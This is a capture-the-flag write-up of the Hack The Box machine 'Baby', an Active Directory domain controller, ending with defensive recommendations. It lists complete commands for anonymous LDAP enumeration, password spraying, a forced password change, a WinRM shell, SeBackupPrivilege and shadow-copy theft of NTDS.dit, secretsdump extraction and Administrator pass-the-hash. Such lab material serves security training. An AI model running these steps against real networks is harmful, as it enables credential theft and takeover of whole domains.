# Baby - Hack The Box Write-Up

## Machine Information

| Field | Value |
| --- | --- |
| Machine | Baby |
| Platform | Hack The Box x VulnLab |
| Operating system | Windows Server 2022 |
| Difficulty | Easy |
| Role | Active Directory domain controller |
| Domain | `baby.vl` |
| Hostname | `BABYDC` |
| Main techniques | Anonymous LDAP enumeration, password spraying, forced password change, WinRM, SeBackupPrivilege abuse, Volume Shadow Copy, offline NTDS extraction, pass-the-hash |

## Executive Summary

Baby was an Active Directory domain controller that allowed anonymous LDAP queries. A user object's `description` attribute disclosed an initial password, while a broader directory search revealed additional account names that were not present in the first user-focused result set. Applying the domain's `First.Last` naming convention produced the username `Caroline.Robinson`, and the leaked password was valid for that account but marked for change at the next logon.

The expired initial password was changed remotely through SMB. The new credentials permitted WinRM access as `Caroline.Robinson`. Her access token contained enabled `SeBackupPrivilege` and `SeRestorePrivilege`; the former permits file reads using backup semantics regardless of normal file ACLs.

A Volume Shadow Copy exposed a stable copy of the otherwise locked Active Directory database. The `SeBackupPrivilege` PowerShell cmdlets were imported and used to copy `NTDS.dit` and the SYSTEM registry hive from the snapshot. Impacket then used the SYSTEM boot key to decrypt the domain credential material in `NTDS.dit`. The built-in Administrator NT hash provided a WinRM session through pass-the-hash, completing the domain compromise.

```mermaid
flowchart LR
    A["Anonymous LDAP bind"] --> B["Password in user description"]
    B --> C["Broader DN enumeration"]
    C --> D["Infer Caroline.Robinson"]
    D --> E["STATUS_PASSWORD_MUST_CHANGE"]
    E --> F["Remote password change"]
    F --> G["WinRM shell"]
    G --> H["Enabled SeBackupPrivilege"]
    H --> I["Volume Shadow Copy"]
    I --> J["Copy NTDS.dit and SYSTEM"]
    J --> K["Offline credential extraction"]
    K --> L["Administrator pass-the-hash"]
```



## Conventions

The following placeholders replace changing lab values and sensitive material:

- `<TARGET_IP>`: current IP address of Baby
- `<INITIAL_PASSWORD>`: password disclosed through LDAP
- `<CAROLINE_PASSWORD>`: replacement password assigned to Caroline
- `<SHADOW_DEVICE>`: device path returned by DiskShadow
- `<ADMINISTRATOR_NT_HASH>`: extracted NT hash for the built-in Administrator

## Reconnaissance

### Port Discovery

A full TCP scan was performed first:

```bash
nmap -p- -Pn --min-rate 5000 \
  -oN nmap/open-ports <TARGET_IP>
```

A focused service scan followed:

```bash
nmap -sC -sV -Pn --min-rate 5000 \
  -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 \
  -oN nmap/services <TARGET_IP>
```

| Port | Service | Relevance |
| --- | --- | --- |
| 53/tcp | DNS | Active Directory-integrated name resolution |
| 88/tcp | Kerberos | Domain authentication |
| 135/tcp | MSRPC | Windows RPC endpoint mapper |
| 139/tcp | NetBIOS | Legacy Windows networking |
| 389/tcp | LDAP | Active Directory directory queries |
| 445/tcp | SMB | Authentication and remote password change |
| 464/tcp | Kerberos password change | Domain password management |
| 593/tcp | RPC over HTTP | Windows RPC transport |
| 636/tcp | LDAPS | LDAP over TLS |
| 3268/tcp | Global Catalog LDAP | Forest-wide directory queries |
| 3269/tcp | Global Catalog LDAPS | Global Catalog over TLS |
| 3389/tcp | RDP | Remote Desktop |
| 5985/tcp | WinRM | PowerShell remoting over HTTP |
| 9389/tcp | AD Web Services | Active Directory management services |

RDP's NTLM information disclosed the domain and host identity:

```text
NetBIOS_Domain_Name: BABY
NetBIOS_Computer_Name: BABYDC
DNS_Domain_Name: baby.vl
DNS_Computer_Name: BabyDC.baby.vl
Product_Version: 10.0.20348
```

DNS, Kerberos, LDAP, Global Catalog, SMB, and AD Web Services on the same Windows host strongly identified the target as a domain controller.

## Anonymous LDAP Enumeration

### Confirming Anonymous Access

`ldapsearch` was used with simple authentication (`-x`) but without a bind DN or password. The successful response therefore demonstrated an anonymous LDAP bind:

```bash
ldapsearch -x \
  -H ldap://<TARGET_IP> \
  -b 'DC=baby,DC=vl' \
  '(objectClass=*)'
```

The server returned directory objects beneath the domain naming context, including users, groups, and organizational units.

### Enumerating User Attributes

A user-focused query requested the attributes most useful for account discovery:

```bash
ldapsearch -x \
  -H ldap://<TARGET_IP> \
  -b 'DC=baby,DC=vl' \
  '(objectClass=person)' \
  sAMAccountName userPrincipalName description userAccountControl pwdLastSet
```

One entry contained a sensitive administrative note:

```text
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
sAMAccountName: Teresa.Bell
description: Set initial password to <INITIAL_PASSWORD>
```

Active Directory's `description` attribute is readable directory metadata, not a secret store. Placing a password there made it available to every principal permitted to query that object, including the anonymous user in this configuration.

### Testing the Disclosed Password

The password no longer authenticated as `Teresa.Bell`:

```bash
nxc smb <TARGET_IP> \
  -u 'Teresa.Bell' \
  -p '<INITIAL_PASSWORD>'
```

```text
[-] baby.vl\Teresa.Bell:<INITIAL_PASSWORD> STATUS_LOGON_FAILURE
```

The visible `sAMAccountName` values were saved to `users.txt`, and the same candidate was tested across those accounts:

```bash
nxc smb <TARGET_IP> \
  -u users.txt \
  -p '<INITIAL_PASSWORD>'
```

No account in that first list accepted the password.

> [!CAUTION]
> Password spraying can lock accounts when the domain policy is unknown. A real assessment should first determine the lockout threshold and observation window, then limit attempts accordingly.

### Why the Broader LDAP Search Found More Names

The original command was:

```bash
ldapsearch -x -H ldap://<TARGET_IP> -b 'DC=baby,DC=vl' dn
```

Here, `dn` was treated as a requested attribute and no explicit filter was supplied, so `ldapsearch` used its default broad filter. The equivalent unambiguous command is:

```bash
ldapsearch -x \
  -H ldap://<TARGET_IP> \
  -b 'DC=baby,DC=vl' \
  '(objectClass=*)' \
  dn
```

This search returned distinguished names for all visible object classes, rather than only the entries returned by the earlier `person` query. Among the results were two person-shaped DNs that had not appeared in the initial username list:

```text
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

A distinguished name's `CN` is not guaranteed to equal `sAMAccountName`. However, the already enumerated accounts consistently used the `First.Last` convention, making `Ian.Walker` and `Caroline.Robinson` reasonable candidates. Authentication testing then validated the inference.

```bash
nxc smb <TARGET_IP> \
  -u users-additional.txt \
  -p '<INITIAL_PASSWORD>'
```

```text
[+] baby.vl\Caroline.Robinson:<INITIAL_PASSWORD> STATUS_PASSWORD_MUST_CHANGE
```

`STATUS_PASSWORD_MUST_CHANGE` is different from an authentication failure. It proves that the username and password were correct, but the account was configured to change its password before completing a normal logon.

## Initial Access

### Satisfying the Forced Password Change

Samba's `smbpasswd` can change a user's password on a remote domain controller. The command prompted for the valid initial password and a new value:

```bash
smbpasswd -r <TARGET_IP> -U 'Caroline.Robinson'
```

```text
Old SMB password: <INITIAL_PASSWORD>
New SMB password: <CAROLINE_PASSWORD>
Retype new SMB password: <CAROLINE_PASSWORD>
Password changed for user Caroline.Robinson
```

The new credentials successfully authenticated over SMB:

```bash
nxc smb <TARGET_IP> \
  -u 'Caroline.Robinson' \
  -p '<CAROLINE_PASSWORD>'
```

WinRM authentication also succeeded:

```bash
nxc winrm <TARGET_IP> \
  -u 'Caroline.Robinson' \
  -p '<CAROLINE_PASSWORD>'
```

NetExec's `Pwn3d!` marker in the WinRM module means that remote command execution is available through WinRM. It does not by itself mean the account is already a local or domain administrator.

### WinRM Shell

An interactive PowerShell session was established with Evil-WinRM:

```bash
evil-winrm \
  -i <TARGET_IP> \
  -u 'Caroline.Robinson' \
  -p '<CAROLINE_PASSWORD>'
```

```powershell
whoami
```

```text
baby\caroline.robinson
```

## Privilege Escalation

### Token Privileges

The account's access token contained several enabled privileges:

```powershell
whoami /priv
```

```text
Privilege Name                State
============================= =======
SeMachineAccountPrivilege     Enabled
SeBackupPrivilege             Enabled
SeRestorePrivilege            Enabled
SeShutdownPrivilege           Enabled
SeChangeNotifyPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Enabled
```

The important privilege was `SeBackupPrivilege`. Windows grants backup software read access to files regardless of their discretionary ACLs when the files are opened with backup semantics. `SeRestorePrivilege` provides the corresponding write-oriented restore capability, but it was not required for this attack path.

Having the privilege in a token is not enough for a normal `Copy-Item` command to bypass ACLs. The application must enable the privilege and open the source with the appropriate backup flags.

### Loading the SeBackupPrivilege Cmdlets

The [giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) project supplies two x64 .NET assemblies that expose the required PowerShell cmdlets. They were uploaded through Evil-WinRM:

```powershell
upload SeBackupPrivilegeUtils.dll
upload SeBackupPrivilegeCmdLets.dll
```

From the remote PowerShell session, both assemblies were imported:

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Get-SeBackupPrivilege
```

Because `whoami /priv` already showed the privilege as enabled, `Set-SeBackupPrivilege` was not required. If it had been disabled, the module could enable it for the current process:

```powershell
Set-SeBackupPrivilege
```

The key cmdlet was `Copy-FileSeBackupPrivilege`, which opens the source file using backup semantics and can therefore read files blocked by normal ACL checks.

### Why a Volume Shadow Copy Was Needed

`SeBackupPrivilege` bypasses file permissions, but the live `NTDS.dit` database is held open by Active Directory Domain Services. A Volume Shadow Copy provides a point-in-time copy that is not locked by the running service.

A DiskShadow script was written to a temporary working directory:

```powershell
mkdir C:\Users\Public\Temp
cd C:\Users\Public\Temp

[System.IO.File]::WriteAllLines(
    'C:\Users\Public\Temp\diskshadow.txt',
    @(
        'set context persistent'
        'add volume C: alias cdrive'
        'create'
    )
)
```

DiskShadow then created the snapshot:

```powershell
diskshadow.exe /s C:\Users\Public\Temp\diskshadow.txt
```

The output disclosed a device path similar to:

```text
Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

The numeric suffix is assigned dynamically and must be replaced with the value returned by the current run.

### Copying `NTDS.dit` and the SYSTEM Hive

The two required files were copied from the snapshot:

```powershell
Copy-FileSeBackupPrivilege `
  '<SHADOW_DEVICE>\Windows\NTDS\ntds.dit' `
  'C:\Users\Public\Temp\ntds.dit'

Copy-FileSeBackupPrivilege `
  '<SHADOW_DEVICE>\Windows\System32\config\SYSTEM' `
  'C:\Users\Public\Temp\system.bak'
```

The files were confirmed before transfer:

```powershell
Get-Item C:\Users\Public\Temp\ntds.dit
Get-Item C:\Users\Public\Temp\system.bak
```

They were downloaded through Evil-WinRM:

```powershell
download C:\Users\Public\Temp\ntds.dit
download C:\Users\Public\Temp\system.bak
```

### Offline Domain Credential Extraction

Impacket's `secretsdump` processed the files locally:

```bash
impacket-secretsdump \
  -ntds ntds.dit \
  -system system.bak \
  LOCAL
```

This operation did not crack passwords. It performed an offline decryption chain:

1. Extract the system boot key from the SYSTEM hive.
2. Use the boot key to decrypt the Password Encryption Key (PEK) stored in `NTDS.dit`.
3. Use the PEK to decrypt account NT hashes and Kerberos key material.

The output included the built-in domain Administrator account, identified by RID `500`:

```text
Administrator:500:<EMPTY_LM_HASH>:<ADMINISTRATOR_NT_HASH>:::
```

All hashes are redacted from this public report. The repeated LM value normally shown by `secretsdump` represents an empty or unused LM hash, not the account's plaintext password.

### Pass-the-Hash as Administrator

NTLM authentication can prove knowledge of the account's NT hash without first recovering the plaintext password. Evil-WinRM accepted the extracted Administrator hash directly:

```bash
evil-winrm \
  -i <TARGET_IP> \
  -u Administrator \
  -H <ADMINISTRATOR_NT_HASH>
```

```powershell
whoami
```

```text
baby\administrator
```

Because Baby is a domain controller, this was the built-in domain Administrator account rather than a separate local workstation account. The result represented complete administrative control of the domain controller and the `baby.vl` domain.

## Security Observations

| Observation | Impact | Recommended control |
| --- | --- | --- |
| Anonymous LDAP queries exposed directory metadata | Unauthenticated users could enumerate the domain structure and account names | Disable unnecessary anonymous LDAP access and restrict readable attributes |
| An initial password was stored in a user description | Any principal able to read the object could recover a reusable credential | Never store secrets in directory description fields; rotate the password and audit similar attributes |
| Multiple accounts shared a predictable initial password | A single disclosed value enabled password spraying and account compromise | Generate unique temporary passwords and enforce secure enrollment workflows |
| The account permitted remote password change and WinRM access | The exposed initial credential became interactive command execution | Restrict WinRM to approved administrative groups and monitor forced password changes |
| A remotely accessible account held `SeBackupPrivilege` | The user could bypass file ACLs and extract protected domain-controller data | Limit Backup Operators and equivalent rights, use separate protected administrative accounts, and monitor backup-privilege use |
| Domain database files could be staged in a public temporary directory | Sensitive credential material could be transferred off-host | Monitor VSS and DiskShadow activity, alert on copies of `NTDS.dit` and registry hives, and restrict staging locations |
| NTLM pass-the-hash was sufficient for WinRM | Disclosure of the Administrator NT hash resulted in immediate domain compromise | Protect privileged hashes, use privileged access workstations, reduce NTLM usage, and apply credential-tiering controls |

## Key Lessons

1. LDAP query filters and requested attributes are separate concepts. Dropping the filter broadened the object search; requesting `dn` only changed the returned data.
2. A distinguished name can suggest a username convention, but authentication is required to validate the inference.
3. `STATUS_PASSWORD_MUST_CHANGE` confirms valid credentials even though ordinary logon cannot finish.
4. NetExec's `Pwn3d!` marker indicates remote execution through the tested protocol, not necessarily administrative privilege.
5. `SeBackupPrivilege` bypasses read ACLs only when software uses backup semantics; the imported cmdlet supplied that behavior.
6. VSS bypassed the live file lock, while `SeBackupPrivilege` bypassed permissions. These solve different problems.
7. Offline `secretsdump` decrypts stored hashes using the SYSTEM boot key; it does not crack them.
8. On a domain controller, compromise of `NTDS.dit` exposes credential material for the entire domain.

## References

- [Microsoft: Privilege constants](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
- [Microsoft: DiskShadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)
- [giuliano108: SeBackupPrivilege PowerShell cmdlets](https://github.com/giuliano108/SeBackupPrivilege)
- [Samba: smbpasswd](https://www.samba.org/samba/docs/current/man-html/smbpasswd.8.html)
- [Fortra Impacket: secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- [Hackplayers: Evil-WinRM](https://github.com/Hackplayers/evil-winrm)

